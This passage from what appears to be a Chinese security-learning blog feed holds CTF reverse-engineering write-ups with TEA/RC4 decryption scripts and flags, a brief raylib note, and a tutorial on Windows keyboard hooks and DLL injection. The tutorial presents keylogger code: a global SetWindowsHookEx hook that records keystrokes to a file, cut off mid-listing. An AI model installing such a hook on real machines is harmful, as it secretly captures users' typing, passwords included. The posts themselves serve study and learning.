class="number">16</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">v6 = target[i];</span><br><span class="line">v5 = target[i + <span class="number">1</span>];</span><br><span class="line">sum = <span class="number">0</span> - <span class="number">0x61C88647</span> * <span class="number">0x64</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x64</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line">v5 -= (key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ (v6 + ((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)));</span><br><span class="line">sum += <span class="number">0x61C88647</span>;</span><br><span class="line">v6 -= (key[sum &amp; <span class="number">3</span>] + sum) ^ (v5 + ((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">target[i] = v6;</span><br><span class="line">target[i + <span class="number">1</span>] = v5;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//void __cdecl sub_A71A10(unsigned int round, DWORD* target, DWORD* key)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//unsigned int j; // [esp+4Ch] [ebp-18h]</span></span><br><span class="line"><span class="comment">//unsigned int sum; // [esp+54h] [ebp-10h]</span></span><br><span class="line"><span class="comment">//unsigned int v5; // [esp+58h] [ebp-Ch]</span></span><br><span class="line"><span class="comment">//unsigned int v6; // [esp+5Ch] [ebp-8h]</span></span><br><span class="line"><span class="comment">//int i; // [esp+60h] [ebp-4h]</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//for (i = 0; i &lt; 16; i += 2)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v6 = target[i];</span></span><br><span class="line"><span class="comment">//v5 = target[i + 1];</span></span><br><span class="line"><span class="comment">//sum = 0;</span></span><br><span class="line"><span class="comment">//for (j = 0; j &lt; round; ++j)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v6 += (key[sum &amp; 3] + sum) ^ (v5 + ((v5 &gt;&gt; 5) ^ (16 * v5)));</span></span><br><span class="line"><span class="comment">//sum -= 0x61C88647;</span></span><br><span class="line"><span class="comment">//v5 += (key[(sum &gt;&gt; 11) &amp; 3] + sum) ^ (v6 + ((v6 &gt;&gt; 5) ^ (16 * v6)));</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//target[i] = v6;</span></span><br><span class="line"><span class="comment">//target[i + 1] = v5;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">swap</span><span class="params">(BYTE* a1, BYTE* a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> v2; <span class="comment">// [esp+4Fh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">v2 = *a1;</span><br><span class="line">*a1 = *a2;</span><br><span class="line">*a2 = v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">Sini</span><span class="params">(BYTE* a1, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> k; <span class="comment">// [esp+4Ch] [ebp-114h]</span></span><br><span class="line"><span class="type">int</span> v3; <span class="comment">// [esp+50h] [ebp-110h]</span></span><br><span class="line"><span class="type">int</span> j; <span class="comment">// [esp+54h] [ebp-10Ch]</span></span><br><span class="line"><span class="type">char</span> v5[<span class="number">256</span>]; <span class="comment">// [esp+58h] [ebp-108h] BYREF</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [esp+158h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i)</span><br><span class="line">S[i] = i;</span><br><span class="line"><span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="built_in">sizeof</span>(v5));</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j)</span><br><span class="line">v5[j] = a1[j % len];</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k)</span><br><span class="line">&#123;</span><br><span class="line">v3 = ((<span class="type">unsigned</span> __int8)v5[k] + v3 + (<span class="type">unsigned</span> __int8)S[k]) % <span class="number">256</span>;</span><br><span class="line"><span class="built_in">swap</span>(&amp;S[k], &amp;S[v3]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">decrc4</span><span class="params">(BYTE* target, <span class="type">int</span> len, <span class="type">unsigned</span> <span class="type">char</span>* a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [esp+4Ch] [ebp-14h]</span></span><br><span class="line"><span class="type">int</span> v6; <span class="comment">// [esp+54h] [ebp-Ch]</span></span><br><span class="line"><span class="type">int</span> v7; <span class="comment">// [esp+58h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line">v6 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">Sini</span>(a3, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v7 = (v7 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">v6 = (v6 + (<span class="type">unsigned</span> __int8)S[v7]) % <span class="number">256</span>;</span><br><span class="line"><span class="built_in">swap</span>(&amp;S[v7], &amp;S[v6]);</span><br><span class="line">target[i] ^= S[((<span class="type">unsigned</span> __int8)S[v6] + (<span class="type">unsigned</span> __int8)S[v7]) % <span class="number">256</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> last[<span class="number">64</span>] = &#123;</span><br><span class="line"><span class="number">0x59</span>, <span class="number">0x1B</span>, <span class="number">0xFD</span>, <span class="number">0xB4</span>, <span class="number">0x6B</span>, <span class="number">0xB8</span>, <span class="number">0xBE</span>, <span class="number">0xD9</span>, <span class="number">0xB3</span>, <span class="number">0xD3</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0xF0</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x18</span>,</span><br><span class="line"><span class="number">0xA0</span>, <span class="number">0x9D</span>, <span class="number">0x3A</span>, <span class="number">0x53</span>, <span class="number">0x6D</span>, <span class="number">0x4A</span>, <span class="number">0x7B</span>, <span class="number">0x26</span>, <span class="number">0x74</span>, <span class="number">0x3A</span>, <span class="number">0x9C</span>, <span class="number">0x4E</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x19</span>, <span class="number">0xD8</span>,</span><br><span class="line"><span class="number">0x72</span>, <span class="number">0xED</span>, <span class="number">0x95</span>, <span class="number">0xB5</span>, <span class="number">0x9C</span>, <span class="number">0x05</span>, <span class="number">0x22</span>, <span class="number">0x56</span>, <span class="number">0xCB</span>, <span class="number">0x7A</span>, <span class="number">0x11</span>, <span class="number">0x91</span>, <span class="number">0x9F</span>, <span class="number">0x7A</span>, <span class="number">0xBC</span>, <span class="number">0x0C</span>,</span><br><span class="line"><span class="number">0x4A</span>, <span class="number">0x69</span>, <span class="number">0x6D</span>, <span class="number">0xCE</span>, <span class="number">0x3D</span>, <span class="number">0xB4</span>, <span class="number">0xAB</span>, <span class="number">0x29</span>, <span class="number">0x61</span>, <span class="number">0xFA</span>, <span class="number">0x62</span>, <span class="number">0x32</span>, <span class="number">0xB4</span>, <span class="number">0xEC</span>, <span class="number">0x4C</span>, <span class="number">0xB6</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x0CAA5BDD</span>, <span class="number">0xD6846924</span>, <span class="number">0x51041EB8</span>, <span class="number">0x8B2AAB06</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">decTEA</span>((<span class="type">unsigned</span>*)last, key);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ikey[<span class="number">16</span>] = &#123;</span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x89</span>, <span class="number">0x33</span>, <span class="number">0x49</span>, <span class="number">0x19</span>, <span class="number">0x13</span>, <span class="number">0xC3</span>, <span class="number">0xC7</span>, <span class="number">0xAD</span>, <span class="number">0xD8</span>, <span class="number">0xE4</span>, <span class="number">0x68</span>, <span class="number">0xFC</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0xBC</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">decrc4</span>(last, <span class="number">64</span>, ikey);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; (<span class="type">unsigned</span> <span class="type">char</span>)last[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// C+vFCnHRGPghbmyQMXvFMRNd7fNCG8jcU+jcbnjRJTj2GTCOGUvgtOS0CTge7fNs</span></span><br></pre></td></tr></table></figure><p>对着码表直接解密</p><p>4yZRiNP8LoK/GSA5ElWkUjXtJCz7bMYcuFfpm6+hV0rxeHIdwv32QOTnqg1BDsa9</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;C0ngr<span class="meta">@tulat</span>1<span class="keyword">on</span>!Y0u_Re_suCces3fu1Ly_Signln!&#125;</span><br></pre></td></tr></table></figure><h2 id="bedTEA">bedTEA</h2><p>观察main逻辑，先用一个奇怪算法生成了key，然后执行XTEA加密，一共三次，这里没看懂奇怪算法是什么，但是好像跟输入无关，于是尝试动调，出来后发现是斐波那契数列，用这个写tea脚本</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">may_ini</span><span class="params">(DWORD* input, DWORD* key_array)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> key_index; <span class="comment">// 对应于原代码中的 v1</span></span><br><span class="line"><span class="type">int</span> key_end; <span class="comment">// 对应于原代码中的 v3</span></span><br><span class="line"><span class="type">int</span> temp_key_index; <span class="comment">// 对应于原代码中的 v4</span></span><br><span class="line"><span class="type">int</span> temp1, temp2, temp3, temp4, temp5; <span class="comment">// 对应于原代码中的 v5, v6, v7, v8, v9</span></span><br><span class="line"><span class="type">int</span> temp6; <span class="comment">// 对应于原代码中的 v10</span></span><br><span class="line"><span class="type">int</span> temp7; <span class="comment">// 对应于原代码中的 v11</span></span><br><span class="line"><span class="type">int</span> key_value; <span class="comment">// 对应于原代码中的 v12</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> input_second; <span class="comment">// 对应于原代码中的 v13</span></span><br><span class="line"><span class="type">int</span> delta; <span class="comment">// 对应于原代码中的 v14</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> input_first; <span class="comment">// 对应于原代码中的 v15</span></span><br><span class="line"><span class="type">int</span> key = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">input_second = input[<span class="number">1</span>];</span><br><span class="line">delta = <span class="number">0x987E55D0</span>;</span><br><span class="line">input_first = *input;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">input_second -= (delta + input_first) ^ (key_array[<span class="number">3</span>] + (input_first &gt;&gt; <span class="number">4</span>)) ^ (key_array[<span class="number">2</span>] + <span class="number">32</span> * input_first);</span><br><span class="line">input_first -= (delta + input_second) ^ (key_array[<span class="number">1</span>] + (input_second &gt;&gt; <span class="number">4</span>)) ^ (key_array[<span class="number">0</span>] + <span class="number">32</span> * input_second);</span><br><span class="line"></span><br><span class="line">delta += <span class="number">0x61CBB648</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (delta != <span class="number">0</span>);</span><br><span class="line">*input = input_first;</span><br><span class="line">input[<span class="number">1</span>] = input_second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">BYTE last[] = &#123; <span class="number">211</span>, <span class="number">109</span>, <span class="number">186</span>, <span class="number">193</span>, <span class="number">54</span>, <span class="number">101</span>, <span class="number">42</span>, <span class="number">137</span>, <span class="number">120</span>, <span class="number">145</span>, <span class="number">245</span>, <span class="number">49</span>, <span class="number">250</span>, <span class="number">190</span>, <span class="number">194</span>, <span class="number">49</span>, <span class="number">144</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">67</span>, <span class="number">212</span>, <span class="number">174</span>, <span class="number">66</span>, <span class="number">69</span> , <span class="number">0</span>&#125;;</span><br><span class="line">BYTE data[<span class="number">24</span>] = &#123;</span><br><span class="line"><span class="number">0xF7</span>, <span class="number">0xA1</span>, <span class="number">0x04</span>, <span class="number">0xD8</span>, <span class="number">0xD3</span>, <span class="number">0xF7</span>, <span class="number">0x2F</span>, <span class="number">0x25</span>, <span class="number">0x06</span>, <span class="number">0x91</span>, <span class="number">0xF9</span>, <span class="number">0xEC</span>, <span class="number">0xDD</span>, <span class="number">0x03</span>, <span class="number">0xC8</span>, <span class="number">0xA9</span>,</span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0x84</span>, <span class="number">0xF0</span>, <span class="number">0xFE</span>, <span class="number">0xAF</span>, <span class="number">0x4E</span>, <span class="number">0xDF</span>, <span class="number">0xD1</span></span><br><span class="line">&#125;;</span><br><span class="line">DWORD rkey[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00000003</span>, <span class="number">0x00000005</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000D</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">may_ini</span>((DWORD*)last, rkey);</span><br><span class="line">DWORD rkey2[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00000015</span>, <span class="number">0x00000022</span>, <span class="number">0x00000037</span>, <span class="number">0x00000059</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">may_ini</span>((DWORD*)last + <span class="number">2</span>, rkey2);</span><br><span class="line">DWORD rkey3[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00000090</span>, <span class="number">0x000000E9</span>, <span class="number">0x00000179</span>, <span class="number">0x00000262</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">may_ini</span>((DWORD*)last + <span class="number">4</span>, rkey3);</span><br><span class="line">std::cout &lt;&lt; (<span class="type">char</span>*)last;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tea流程之后后面好像xor了好多东西，把每个地址都改名</p><p><img src="https://s2.loli.net/2024/07/07/ZAy7cQHEmurkDh2.png" alt="image-20240707151103500"></p><p>然后对最后检查的地址下读写断点，发现第一次写入时是倒序传入</p><p>然后异或了0x33</p><p>那么把最后的值倒序然后异或，然后解密tea即可得到flag</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="symbol">y0u_reallyl1ke_te@</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">好久没打CTF了</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="RE" scheme="https://www.pri87.vip/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>raylib学习</title>
    <link href="https://www.pri87.vip/posts/aa7cf3e8.html"/>
    <id>https://www.pri87.vip/posts/aa7cf3e8.html</id>
    <published>2024-06-18T14:16:08.000Z</published>
    <updated>2024-07-07T11:14:35.496Z</updated>
    
    <content type="html"><![CDATA[<p>由于C语言工程实践要用图形化界面，所以我准备开始学一下raylib<br>因为我觉得很好看</p><p>下载方式：</p><p><a href="https://www.raylib.com/">raylib | A simple and easy-to-use library to enjoy videogames programming</a></p><p>它本身不是单纯的图形库，而是集成的游戏开发工具</p><p>其中的raygui才是我这次准备学的重点</p><p>编译：</p><p><a href="https://blog.csdn.net/qq_37661242/article/details/123279843">VSCode + Mingw安装raylib_raylib安装-CSDN博客</a></p><p>要使用图形库时</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> RAYGUI_IMPLEMENTATION</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;raygui.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>然后尝试用内置的操作写代码，使用vscode和cmake，测试成功</p><p>至于vs，之后再试。</p>]]></content>
    
    
    <summary type="html">图形库的学习</summary>
    
    
    
    <category term="编程" scheme="https://www.pri87.vip/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="cpp" scheme="https://www.pri87.vip/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>《逆核》07-键盘hook和DLL注入</title>
    <link href="https://www.pri87.vip/posts/8535f1d8.html"/>
    <id>https://www.pri87.vip/posts/8535f1d8.html</id>
    <published>2024-06-10T12:07:34.000Z</published>
    <updated>2024-06-26T14:11:07.114Z</updated>
    
    <content type="html"><![CDATA[<p>之前尝试过对函数的hook，这次参考了《逆向工程核心原理》，尝试使用windows的系统函数在系统层面对message进行hook</p><hr><h2 id="消息">消息</h2><p>Windows是以事件驱动来工作的。每当用户执行一个操作，都会让OS把对应的消息发送给相应的应用程序。</p><p>每个消息都是一个结构，其中的message是对应的消息类别，32位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMsg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       HWND    hwnd;       <span class="comment">//接受该消息的窗口句柄</span></span><br><span class="line">       UINT    message;    <span class="comment">//消息常量标识符，也就是我们通常所说的消息号</span></span><br><span class="line">       WPARAM  wParam;     <span class="comment">//32位消息的特定附加信息，确切含义依赖于消息值</span></span><br><span class="line">       LPARAM  lParam;     <span class="comment">//32位消息的特定附加信息，确切含义依赖于消息值</span></span><br><span class="line">       DWORD   time;       <span class="comment">//消息创建时的时间</span></span><br><span class="line">       POINT   pt;         <span class="comment">//消息创建时的鼠标/光标在屏幕坐标系中的位置</span></span><br><span class="line">&#125;MSG;</span><br></pre></td></tr></table></figure><p>标识符：</p><blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WM_NULL<span class="comment">---0x0000    空消息。</span></span><br><span class="line"><span class="number">0</span>x0001<span class="comment">----0x0087    主要是窗口消息。</span></span><br><span class="line"><span class="number">0</span>x00A0<span class="comment">----0x00A9    非客户区消息 </span></span><br><span class="line"><span class="number">0</span>x0100<span class="comment">----0x0108    键盘消息</span></span><br><span class="line"><span class="number">0</span>x0111<span class="comment">----0x0126    菜单消息</span></span><br><span class="line"><span class="number">0</span>x0132<span class="comment">----0x0138    颜色控制消息</span></span><br><span class="line"><span class="number">0</span>x0200<span class="comment">----0x020A    鼠标消息</span></span><br><span class="line"><span class="number">0</span>x0211<span class="comment">----0x0213    菜单循环消息</span></span><br><span class="line"><span class="number">0</span>x0220<span class="comment">----0x0230    多文档消息</span></span><br><span class="line"><span class="number">0</span>x03E0<span class="comment">----0x03E8    DDE消息</span></span><br><span class="line"><span class="number">0</span>x0400             WM_USER</span><br><span class="line"><span class="number">0</span>x8000             WM_APP</span><br><span class="line"><span class="number">0</span>x0400<span class="comment">----0x7FFF    应用程序自定义私有消息</span></span><br></pre></td></tr></table></figure></blockquote><p>消息分为：</p><ul><li>窗口消息：对窗口的操作触发窗口消息：创建窗口，移动窗口，单机鼠标</li><li>命令消息：属于窗口消息，处理从一个窗口发送到另一个窗口的用户请求，比如按下按钮</li><li>控件通知消息：用于子窗口通知父窗口</li></ul><p>每一个程序在执行后，都存在一个消息队列，进程通过第一次调用GDI函数创建一个队列。所有消息都存放在这个队列中，应用程序通过一个消息循环，读取其中的消息并响应。消息队列分为系统消息队列和线程消息队列，系统消息队列由Windows维护，线程消息队列由GUI线程维护。</p><p>以鼠标点击举例：</p><p>当鼠标点击时，驱动创建对应的消息传送到系统消息队列。当有应用要读取时，系统从系统队列中把对应的消息取出，传给对应的线程消息队列。线程在消息的读取循环中把消息拿出来，通过操作系统发送到对应窗口过程处理。</p><hr><h2 id="hook">hook</h2><p>hook，就是在它们传递过程中插入自己的代码的操作。</p><p>现在用键盘钩子举例</p><p>重要的函数有以下几个：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetWindowsHookEx</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);<span class="comment">//创建一个钩子</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">UnhookWindowsHookEx</span>(g_hHook);<span class="comment">//删除一个钩子</span></span><br></pre></td></tr></table></figure><p>我们要调用这个api执行钩子操作，可以直接把这个写到exe里面，但是这样就是exe监听其它的，而不是直接把dll放进去，所以把这两个函数写到dll里面并添加dllexport关键字作为导出函数，这样就可以被其它进程访问，我们可以专门写一个exe去执行它</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">HookStart</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">g_hHook = <span class="built_in">SetWindowsHookExA</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">HookStop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (g_hHook)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">UnhookWindowsHookEx</span>(g_hHook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>然后再写钩子的回调函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">writeToFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span>* user_dir = <span class="built_in">getenv</span>(<span class="string">&quot;USERPROFILE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (user_dir != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="type">char</span> file_path[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">snprintf</span>(file_path, <span class="built_in">sizeof</span>(file_path), <span class="string">&quot;%s\\outputkey.txt&quot;</span>, user_dir);</span><br><span class="line">FILE* fl = <span class="built_in">fopen</span>(file_path, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fl != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">fwrite</span>(str, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(str), fl);</span><br><span class="line"><span class="built_in">fclose</span>(fl);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> ch[<span class="number">15</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (((DWORD)lParam &amp; <span class="number">0x80000000</span>) &amp;&amp; (HC_ACTION == nCode)) &#123;</span><br><span class="line"><span class="keyword">switch</span> (wParam) &#123;</span><br><span class="line"><span class="keyword">case</span> VK_RETURN:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ENTER]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_BACK:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[BCAKSPACE]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_TAB:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[TAB]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_MENU: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ALT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_ESCAPE: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ESC]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_DELETE: &#123; <span 